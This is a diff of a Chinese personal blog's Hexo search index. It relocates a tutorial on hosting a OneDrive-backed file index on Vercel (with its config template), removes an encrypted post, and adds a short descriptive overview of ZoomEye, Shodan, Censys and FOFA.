+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
+<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
+<p>当然，拿它来当图床，我想也是很不错的。</p>
+<h1>ANINEGの网盘</h1>
+<p>最后，放上我的网盘来给大家参考一下：</p>
+<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
+<p>网盘链接：</p>
+<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
+      <tags>
+        <tag>Vercel</tag>
+        <tag>网盘</tag>
       </tags>
   </entry>
   <entry>
@@ -1605,23 +1660,33 @@ PNG图片文件结构：</p>
       </tags>
   </entry>
   <entry>
-    <title>《我不是药神》</title>
-    <url>/2022/03/17/wobushiyaoshen/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28bcd797fdd03af9079fd90a6aafb5667f8bccf824571670406f21c45ccb5cc1e47fdbd44b5d7948120df03b74e2d9c9453e3741d3ee454890670de4fdf917e8d72f32f924e799aebb3825fd0c8cc2c150740b19eb4ec53bc65fe929776e7f02622eb1c82d67baa3ed71d5bd4f4c3e067a8aedec73189c14bd616a510346983b14d83142b5759903890555356bdf4e71dd9f143a331c91587c1ef7abebca3fdcc7fb240f7ab6834375362c16e3e10163062d498f81e12b0faa815242b25ecb4df22429266042453aadae9c2a857a55ddf8a62731f6e2932bd22698916064fd08d06a841534b0866d7728247977b22bf205b5b94ad809f7249228f17d880f727967c8a0bd7062727e68f77227ffdafa2558714cb22db74c3850bd99f97c3119a065a03e56b43d56ddc82ba8d02949bd16c71599b673a3cf0e3a7e0c39c7be0184b9f895f5a4daab98ecacc17b6345c7ed805d8137abcb04c29026e95853ef609bef9b1a5169c35b027ce46de901efc555b834c439e78dd9276412cc5b02eadef701fd5db3a62c714bb502eed6645121a64a7d45b3d4164874b5d44defc352c5dc935400fb1966ce54395a4fc24138a2614514d4a94c5443ea358934abc666c829721d9ea38e891a1da25542d5deaeafe55866416a6763fa28ff600fba9a115cc8373ea8daec78cd431dbe847496276e4f4af064e96ab590fc7ba69f044e2573077d9b680ceca7a8004a5e47230f6d04cd7c07280cefbd1b4a48e7ea911909bcc59789c33cf5f9d7abf3a3bc154e354146bc80a419dfcbfccee7ed342f3b2856b465575cf8c266b85d40ef9fed7a2505abc6659643313b363824c2310e8fed8f633b5ba21342576d2be25dddf61ac2c66d52a81eb83f913a17e007d91f38f2d3c9e46c95aa795ee4bbb0f9e8c83db338c05d5c332be29fe250d6c807ab1f4be56df0bb046b92ffb469230ff66696f803085fd9c355a5243984577577220a27e84f41a5e4a81000e65e289513f914cdff9d5e2cb8ee57e71c62cffc36df1b8c0f01e1433ebf9431bea3727ad9cabc537b4ea5cbfd6faee2161f6e6f79cbc06da83fb80971d09703e617af93b01bc8333ef109eff4d198c34a22a45184c988b60ccbcb5a47e9144d1d1c2cf862f7602754eafb1218cfa6980e3de4905dbb03c5e63b7249aaebe28aefde6e51a37897eda29f1c0bef37da797ed2afa710e5d2714cc8258604908588c95b6bf8e3cc1585180fb57e58bd1808d9a5f05abc5f28af1af791018c407d8db26c32f07e60d45532d09343da936078f4e04d2515fbc63b5f1d53bff4cd6f27e81435d0a821b69e7b8914816af1c397edecaf9e3930e56e1f1e632ce517572c73ce64b70f26b63f921e0b6d69788acb054339a743df82e76fafb585f4f7966bb33a2501df5b02831c00d6f49381de41f6bc78632a055b37bb86e2f9bda1319cfc76f8cf95978a2af6cc33176588562f4d2139b16d0ed18226af8f692435ded43069cebd2b0e6654350c06f79bd4ad5520da3ce1a150e7fa0bd950cc63ada79b5a2f4f5db9c270680adf27499e1ad8cee50613b1a06e8d1b86472e11c3ad526ccc6a485722b27e1f1fa022c18e91a4b6ce0ac76da77b496dd9b016dc58a8a29f0045b524ba79b1d010c682ef061121492638b323332a2170e839c241e3206fa33d3210dc55b34ae4926dd22f70419cb4720b6545874b7846c23b60ac5279f83d7cc57dd7a7ed10e8ccb24eb7b8587efd2e3d13ab7456a0813388ecfe80a1936f5b91e3c277e60c7934fc3fe61676cfaaeb25260df3aa2c28f7fd782772212720434ff5e6ece2e6161db0a24785fe469220578561b32863b0e0c9506facf9b4c0205083a9aa382df58acdfafa71de0a84a2d58f8efa637d54e874f23963d088b4b5f59d6a07546fe030a2bc7da9e1da4d6d4fcd4d2cc315cbfe408a78dc82d0b78ae3ca25188b447aa0e8a62d3903b7feaf1421f7191d3a98f6849f8608fe24bacf734c01e949707e99caee6748f537f1d13f57535f75d5cb7a2fe8b5abf7ad210842ecee55ea7d45ed8f8ca7633d8136f93194c9247993e636766cb8e0f003a7f7fc922820acb16d7fbc7e55b776ccd30dfe05fbe1d54a6bf6e283f8556eff4945327b2a8f0afb8d99f4f35327a6fbbfd630db9e9ed20ced7cb0bf2593622e4906b7f6af5a8646037c1beaece1818a561dc16141f784bc14186ff66fce5aba30ccdcef5982cb6ae18d8f00b54aa0b4dee315c95dffae347bd296bb5b5c23b7356b24880aee37bbc9bec86eefaa8734638fb146475d222a13bb3b14b9dfd05da8026bc0e462758685fdacec1e17768cefc168b759abf909aab856e8df0f8368671dcb96401e9c30c8a8456c554a8bce3cf301769b6e5c92923da34b0d8a04f14d2eb0f5bc4372afd50586a25b9f50c1cfabf43dc83a216cb7c47cf9445abb3b30bfa2c25a586381726449e29e206c2468b6ca68cf05d88b1b881e005385cbcd8c9f6d4e8bc0ac0378b898b22004d2576ee1b50f62e2c1f35491db5cf51b8a33db23eb44d4890491222e79a92395e9494a2018a9a9dec978d8ba7fd4be5b06a2bda49ab5c63cade4bd520a22f1482b06e0b1cd213f28a24a29f102ee527a65cba5e58c550fa94701f7d2f7a370bc28ea38318fa1c40c630139e455d7d8d4293945f6703c304468ec9db040c062012c88abef9ea414e6cbc03f528587e38fd599f728878dead5ba09eb046b1043c32ab65e110007e81310c7c70023e018a02551c82776218280f053183222681cbfa52b649fdf16bccb1b0ad52a2b2466c13e5d74c757b6279456e095d15700c454ca1d80d4e53610caee23bc6a0c2e1ea0500d9b657c52da52242cbeec41c54b6326dc0a27ff9fd90890e0052af497016d6dc7db63a7faf124eb412b3e2ec8dadc22ebcecd37fd5c28eb1dbc3e6e38ba3d1c6b00d7c5f12c92934f7caba5fdf68222eaf589506112a82c7a0702b71ef42209f15d358a72cc96e0b01c5f7e3d2b5c4a642ba0cdde80d5514245873df84467a6c36ee889b821d1981dbe802823e2e6ba059de91f3f1df3546aa5aa3756e678ec41670cac78bccb7cf09206a0d937c1d2e4ccc03bf63e9141dde155606eb7241527138dbb477d0ca3f9ec7a9d17cd09def2185a4d8ef1323031c70ab269387f106bf9cf653eceaa5f3d5296db70d0901e7aa2a3d68fc612eb365c75656c00941b55d3a4d45455fac6059002f898a21c7f4b460532dda2bf8eb03e8c16f720e29f1074116a78301f9bbd2a43d274e39f6898ba10758bcbffcee3f661ca3e3c227a6c9b99ddec81437cbdb4187b79ba47495358d45e32ac793ef0953e4dd7e7174eaea19d0eb4fdc4b3c6c9ffe9ce3c1661f91e4ede119a9715f00f9f12e568fab689ab8feb561cbdf0181da05dd11fd5cea4819e6d5b6738ec24cb1d717769e6608aea0a7bc523aef9928ce6a02c03ce766f322b79d477e028e7e8b2a77f7c701f4d839ac7a8d95408461a74cdb4047288ef33148a4355c2629821241bd91c95aa8baa7ced9e6a57a3899fd0d359a2b260b0d83777b8718d0035184c61ebafaa11143675da1cd67890351d5862011c35429c4bf7927548b2f36b1efccad7ad399aac8332164b2ad901a6e9663890449eecab58d147acb6a06d676da278b3a523a951b6b85b2b3f24306dd3b6def987c78e67ecda4f33212fec193d611267749cdde871fc84d059344ecde839338706eafcbf31f640f889c283153c55c1ad7c40055a9f4943edc4a98046d5e6655d329d2969f2d5b7edeb4bacf67c64e4706dbacb3da84d18e25f0552dc268ba34bd23e96f22a1371b58f49fac0bb5770832a82ebb95c9cc762a26714ef45a1805897ea72d44b24573ac89d8cc7e602610d1edc44b0cc1e5d811bca3fba5c6b74d34107fa51fe4c5bba03fda1d7c588425fac6f927c4185b98d76b203a793de4d9168ec2e63d218f968b0e65926ac89c35204eca2801fae023794fa407550ef38d46e81ecfae990ad3adb30d658879445f88b494a4f53ac269c9775ac16340f30e4c15efc46de0fa21c217b8b8168bbb0a1b0aa7f50f0f33a516cfac03f1cb790be05002a11db7f47412ca20cee8df52d9821251441ddaef62db46d217eb37f48d4e5db7c2e1f797003a60419cb4c555e80974a4419c95c368f64d8ae8f5156337900bbd258ada5fffec1914d6aa6aa05cf9ef3248177e24f1568c14d032a5023141e84ef716c6488791b3a90def98f561fde7b9a7908f3bcc3e53bf6b436d48c73d834f48149e2b9ac4cdd24da95354f41a6eed783034e739aef8b8286c49970620d636e6d90c72ac28357a4a780002ac5e96e4abce44577b9533e40095c93cf3cdd566717124ba5a8c84ac5c08f18b8916034dcfed0db6269a74df9282dadec46d0bbe2dde8708ff20db447f04befa705d2e48eb1462d0d82b3dd68f958c15d40a17b1b9cac98d2b3767638551dec3531729edf90b22973fbb15d133d162a2760de9ae1a401563295a85b87c7f24f5ce7ccc94dcfea1b512007ff90fb7e7d6a5ffe12dbd94aa4c8b40237471f53203b5c6112f23bd41de769e514285c29156248538866eacaaa30bb86469e0e3fd56da5d86e097f6704ee54297ce6046e80ccf0323cf450cdaade7e472f6a2ee24af6f974d9b11cb088f35a50f3bab88d4ab64b8f994a9f3d70ca56d49b0024a7c6be799c1a9dfc8e71627530f52ff4d09d5707a75fa3cb1eb4d2cd4ff2a4856c4e06ba798b3f84008e03867d486f314c234bfec92463cc842b822fada1f485d56efa01d514e8806272d455c36fcd87414628473dbaf582ee9d4cd376ef759f30c885679efa1bf54c299db82f7bd860bc2e83e7227f3363a6eabe4449d31249c5fef01e0bc10e703ef20298140b5dd39a2a30d954d5a20ebaa9114af580d8cfc6fba1909db719b5bfe13f83ad0c6d20d7ef94ed755dab8e4550ff7d3237ffb707af42f11256f59890ab5ad2bf6cfa57e4979fb3db0564b13f12fc26785d96e0b138afd14d0b58123287270e6787768adbdd9938adfcb00e4d6f8b49d26d377b449fea51de5d425de1f774901522f235f3e028cc7a73a7d4d09c36524fe47945503073c5bc0477b86a46160a902b0696f4582817e01e0e70e4f622e92d90ca4a4123f9cf48dcfb91d6d2fd7afa940d35f5326d618d1ddb99620dc0bb9823e029028de0ff7d5704ce2a7085419ebb02d3793499d092b207242a1ca674ac2f3974e1d579c7c7261c6972007df6839eba1aabb12055107877912d62a7f7627002b700e154569853862aa6bd43d4f5478be4718fb8612ce90b48692ee1c29ef569ab6b08f4d81905fb8a82415a348b904087cefcab8a880141c33a4320f4653789ac38c55c05628f56eabc5f04db8e64a70488707ddbf5f6c8e0ac9f7ed9ee0b818b6e762b1b1c9b302fb651cf1ef7a64d6bf73937efbe4736372a74175f9845f5922b9e4d04c2186a5ea03dff9cb85907b8c2cc19f55a1253d18536dc779578c84fbd568d55ba9658c2ae6d5f6c590aea67f2c247f3c6a470f4395454bd69bfd8ef83a537b08286ac631e15585cdfbc4eb19809edc5651f16b09dab9556c00ad99e3a26393bb542db8786ceddca2687ae321ed721854c1ebb23567f5824b25fcab6cc4e4e48cbb23e61d4e9e29be4cc6a93dd665103553e4dd304005045635c044e8803617a88a19f14be8f7d420fbe0feea1b7f43ecd721d7b9e7779f4fc434bed7b03cd9119bfe79e06a1698d0644a5e5ae44cf3e1023f352cef7d4e5f5330429c8241d32ee22130c9ee1e3715a3e5d58f3950c9f379cef0d0d69c9837688914334ef892346a0f58b132f628c4df86507af6bec6547e810bfdcb98c98e4f211f0ceb3a6f094b33d4d644b6623b39dc06d82a2effe78d2957a43f4cdec02c145f7c3b97ec870c6dc228e86b45db46e26c2590e59d64d14d27a85be8221a87da0b4f0273952a214db0333112fd7b5242954e89f1cfbb1aff46786e87e1bd7e3d185283bd103da9e473d559784fbafc3034ec46b872e5980fe4bc19344628d89859479a000a23775cb041aade2da0f25370c70bc449629a608f2a251d1d0751c7b3be73854ff</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-up">
-      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <title>ZoomEye-网络空间搜索引擎</title>
+    <url>/2022/10/09/zoomeye/</url>
+    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
+<p class="p center small">一个针对网络空间的搜索引擎</p>
+<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
+<h1>ZoomEye</h1>
+<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
+<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
+<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
+<h1>其他网络空间搜索引擎</h1>
+<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
+<h2 id="Shodan">Shodan</h2>
+<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
+<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
+<h2 id="Censys">Censys</h2>
+<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
+<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
+<h2 id="FOFA">FOFA</h2>
+<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
+<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
+]]></content>
       <categories>
-        <category>随手记</category>
+        <category>学习笔记</category>
       </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
   </entry>
   <entry>
     <title>CTF隐写术(其他文件隐写)</title>
@@ -3683,71 +3748,6 @@ PNG图片文件结构：</p>
       </categories>
       <tags>
         <tag>隐写</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建几乎0成本的个人网盘！</title>
-    <url>/2022/11/20/yunpan/</url>
-    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
-<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
-<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
-<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
-<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
-<h1>搭建网盘</h1>
-<h2 id="准备工作">准备工作</h2>
-<ul>
-<li>一台能上网的电脑</li>
-<li>一个GitHub账号</li>
-<li>一个Vercel账号</li>
-<li>一个Onedrive账号</li>
-</ul>
-<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
-<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
-<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
-<p>当然，拿它来当图床，我想也是很不错的。</p>
-<h1>ANINEGの网盘</h1>
-<p>最后，放上我的网盘来给大家参考一下：</p>
-<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
-<p>网盘链接：</p>
-<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>随手记</category>
-      </categories>
-      <tags>
-        <tag>Vercel</tag>
-        <tag>网盘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ZoomEye-网络空间搜索引擎</title>
-    <url>/2022/10/09/zoomeye/</url>
-    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
-<p class="p center small">一个针对网络空间的搜索引擎</p>
-<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
-<h1>ZoomEye</h1>
-<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
